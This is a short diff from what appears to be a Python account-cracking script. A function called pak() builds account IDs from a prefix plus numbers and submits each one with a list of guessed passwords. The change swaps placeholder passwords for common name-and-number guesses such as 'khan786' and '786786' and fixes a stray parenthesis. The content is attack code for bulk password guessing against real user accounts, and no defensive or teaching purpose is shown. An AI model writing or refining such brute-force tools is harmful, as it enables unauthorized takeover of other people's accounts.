@@ -521,7 +521,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'First Last','first last','First123','first123','firstlast''First@123''first@123,]
+                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
                                 MAHIN.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -1021,4 +1021,4 @@ except requests.exceptions.ConnectionError:
         print('\n No internet connection ...')
         exit()
 except Exception as e:pass
-menu())
+menu()
